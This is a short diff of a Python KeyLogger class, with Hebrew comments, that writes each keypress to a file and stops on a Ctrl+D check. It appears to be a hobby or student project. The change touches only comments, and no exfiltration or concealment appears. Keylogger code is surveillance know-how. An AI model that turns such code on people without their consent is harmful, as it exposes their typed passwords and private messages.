@@ -9,9 +9,10 @@ class KeyLogger:
         # אחראי על הפעלת פונקציות יפוי ושמירה בכל לחיצה
         def __on_press(Key):
             key_nise = self.nurmal_key(Key)
-            # print(key_nise)
+            # לתקן את הדרך
             FileWriter().write(key_nise)
 
+        # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
         def on_release(key):
             try:
                 if key.char == '\x04':  # Ctrl+D
